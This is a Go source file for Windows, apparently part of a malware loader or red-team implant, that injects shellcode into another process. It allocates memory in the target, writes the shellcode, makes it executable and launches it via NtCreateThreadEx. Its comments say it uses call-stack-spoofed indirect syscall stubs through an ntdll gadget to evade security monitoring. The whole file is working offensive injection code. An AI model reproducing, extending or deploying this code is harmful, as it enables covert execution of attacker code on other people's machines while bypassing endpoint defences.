//go:build windows
// +build windows

package main

import "fmt"

// doNtCreateThreadEx completes full injection via NtCreateThreadEx syscall.
// All memory ops and thread creation use call-stack-spoofed indirect syscall stubs.
func doNtCreateThreadEx(hProc uintptr, sc []byte) error {
	sm := newSyscallManager()
	defer sm.freeStubs()

	allocAddr, err := syscallNtAllocateVirtualMemory(sm, hProc, uintptr(len(sc)), PAGE_READWRITE)
	if err != nil {
		return fmt.Errorf("NtAllocateVirtualMemory: %w", err)
	}

	if err := syscallNtWriteVirtualMemory(sm, hProc, allocAddr, sc); err != nil {
		syscallNtFreeVirtualMemory(sm, hProc, allocAddr)
		return fmt.Errorf("NtWriteVirtualMemory: %w", err)
	}

	if _, err := syscallNtProtectVirtualMemory(sm, hProc, allocAddr, uintptr(len(sc)), PAGE_EXECUTE_READ); err != nil {
		syscallNtFreeVirtualMemory(sm, hProc, allocAddr)
		return fmt.Errorf("NtProtectVirtualMemory: %w", err)
	}

	hThread, err := syscallNtCreateThreadEx(sm, hProc, allocAddr)
	if err != nil {
		syscallNtFreeVirtualMemory(sm, hProc, allocAddr)
		return fmt.Errorf("NtCreateThreadEx: %w", err)
	}
	procCloseHandle.Call(hThread)
	return nil
}

// doNtCreateThreadExIndirect uses indirect syscall stubs through ntdll's syscall;ret gadget.
// Falls back to direct stubs if spoofed stubs can't be built.
func doNtCreateThreadExIndirect(hProc uintptr, sc []byte) error {
	sm := newSyscallManager()
	defer sm.freeStubs()

	allocAddr, err := syscallNtAllocateVirtualMemory(sm, hProc, uintptr(len(sc)), PAGE_READWRITE)
	if err != nil {
		return doNtCreateThreadEx(hProc, sc)
	}

	if err := syscallNtWriteVirtualMemory(sm, hProc, allocAddr, sc); err != nil {
		return fmt.Errorf("NtWriteVirtualMemory indirect failed: %w", err)
	}

	if _, err := syscallNtProtectVirtualMemory(sm, hProc, allocAddr, uintptr(len(sc)), PAGE_EXECUTE_READ); err != nil {
		return fmt.Errorf("NtProtectVirtualMemory indirect failed: %w", err)
	}

	hThread, err := syscallNtCreateThreadEx(sm, hProc, allocAddr)
	if err != nil {
		return fmt.Errorf("NtCreateThreadEx indirect failed: %w", err)
	}
	procCloseHandle.Call(hThread)
	return nil
}
